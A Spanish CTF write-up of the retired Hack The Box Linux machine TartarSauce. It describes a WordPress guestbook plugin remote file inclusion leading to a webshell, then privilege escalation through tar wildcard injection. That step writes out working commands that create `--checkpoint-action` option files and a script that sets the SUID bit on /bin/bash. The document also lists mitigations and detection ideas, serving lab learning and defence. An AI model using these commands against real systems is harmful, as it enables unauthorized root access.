---
machine: TartarSauce
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, wordpress, rfi, tar, wildcard-injection, systemd]
---

# TartarSauce — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

WordPress con el plugin Gwolle Guestbook permite incluir un archivo remoto y ejecutar PHP como `www-data`. La escalada abusa de un script de backup que lanza `tar` con un comodín dentro de un directorio escribible: la inyección de opciones `--checkpoint-action` ejecuta comandos como `onuma` y deja un binario SUID.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p22,80 <IP>
```

- SSH y Apache.
- WordPress y un plugin antiguo de guestbook.
- `wpscan` confirma versiones y usuarios.

## Enumeración

```bash
wpscan --url http://<IP>/ --enumerate p,u
curl -s http://<IP>/wp-content/plugins/gwolle-gb/readme.txt
```

El plugin permite una inclusión remota de archivos en una de sus acciones. Se aloja un PHP propio y se incluye por HTTP para obtener ejecución como el usuario del servicio web.

## Foothold

```bash
curl -s "http://<IP>/wp-content/plugins/gwolle-gb/frontend/gb-ajax.php?..."
```

La inclusión controlada devuelve una webshell. Se estabiliza y se enumera el sistema.

## Movimiento lateral

El código y los backups del sitio contienen credenciales y rutas internas. Se identifican el usuario `onuma` y el script `/usr/local/bin/backuper`, ejecutado por un timer de systemd.

```bash
find / -name '*backup*' -type f 2>/dev/null
systemctl list-timers --all
```

## Escalada de privilegios

`backuper` ejecuta `tar -czf ... *` dentro de un directorio escribible. Los nombres que empiezan por `--` se interpretan como opciones:

```bash
printf '#!/bin/bash\nchmod +s /bin/bash\n' > /tmp/x.sh
chmod +x /tmp/x.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh /tmp/x.sh'
```

El siguiente disparo del timer ejecuta el script como `onuma`; después `/bin/bash -p` permite leer la flag de root.

## Evidencia

- `wpscan` con el plugin vulnerable.
- Petición de inclusión remota y `id` como `www-data`.
- `systemctl list-timers` y contenido de `backuper`.
- `ls -l /bin/bash` con el bit SUID.

## Lecciones aprendidas

- Un plugin abandonado puede convertir WordPress en una puerta de entrada completa.
- Los scripts de backup deben usar `--` y rutas absolutas, no comodines.
- Un timer de systemd amplía la ventana de ejecución de un script inseguro.

## Mitigaciones y detección

- Actualizar o retirar Gwolle Guestbook; bloquear inclusiones remotas.
- Ejecutar backups con un usuario sin privilegios y sin comodines.
- Alertar de `--checkpoint` en argumentos de `tar` y de nuevos SUID.

## Referencias

- <https://www.hackthebox.com/machines/TartarSauce>
- <https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html>
- <https://attack.mitre.org/techniques/T1190/>
- <https://attack.mitre.org/techniques/T1059/004/>
